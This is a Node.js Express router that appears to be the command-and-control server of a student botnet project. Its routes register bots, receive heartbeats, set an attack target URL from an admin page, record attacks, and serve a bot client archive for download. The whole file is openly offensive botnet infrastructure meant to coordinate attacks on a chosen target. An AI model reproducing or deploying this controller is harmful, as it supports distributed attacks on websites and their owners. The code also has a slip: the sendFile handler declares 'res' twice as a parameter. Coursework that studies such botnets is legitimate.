const express = require('express')
const debug = require('debug')('server:handleRoutes')
const chalk = require('chalk')
const moment = require('moment')

const bots = require('../controllers/bots')

const routes = express.Router()

function middleware(req, res, next) {
  next()
}

function router() {
  routes.use(middleware)

  async function admin(req, res) {
    try {
      var botsArray = bots.getBots()
      var target = bots.getTarget()
      var attacks = bots.getAttacks()
      // debug(attacks)
      res.render('admin', {
        currentTime: moment().format('L, LTS'),
        bots: botsArray,
        target: target,
        attacks: attacks
      })
    } catch (err) {
      console.log(err)
      res.sendStatus(500)
    }
  }

  async function sendFile(res, res) {
    res.sendFile("/Users/matthewrusczyk/dev/security/CS492_finalproject_botnet/client.tar.gz");
  }

  async function landing(req, res) {
    const bot = req.body
    try {
      if (Object.keys(bot).length !== 0) {
        let added = await bots.add(bot)
        if (added) {
          res.sendStatus(200)
        } else {
          res.send('Bot already exists')
        }
      } else {
        res.send('Did not recieve a bot in payload')
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }
  
  
  async function heartbeat(req, res) {
    debug('HEARTBEAT')
    const { ip } = req.params
    try {
      var response = await bots.heartbeat(ip)
      res.send(response)
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
    
  }
  
  async function target(req, res) {
    let attack = req.get('user-agent')
    // debug(attack)
    // debug('TARGET URL: ', req.body.url)
    const { url } = req.body
    try {
      var response = await bots.setTarget(url)
      if (response === url) {
        res.redirect('/admin')
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }

  async function attack(req, res) {
    let attack = req.get('user-agent')
    // debug(req.useragent)
    try {
      var response = await bots.documentAttack(attack)
      if (response) {
        res.sendStatus(200)
      } else {
        res.sendStatus(403)
      }
    } catch (error) {
      console.log(error)
      res.sendStatus(500)
    }
  }

  routes.get('/admin', admin)
  routes.post('/landing', landing)
  routes.get('/heartbeat/:ip', heartbeat)
  routes.get('/sendFile', sendFile)
  routes.post('/target', target)
  routes.get('/attack', attack)


  return routes
}

module.exports = router()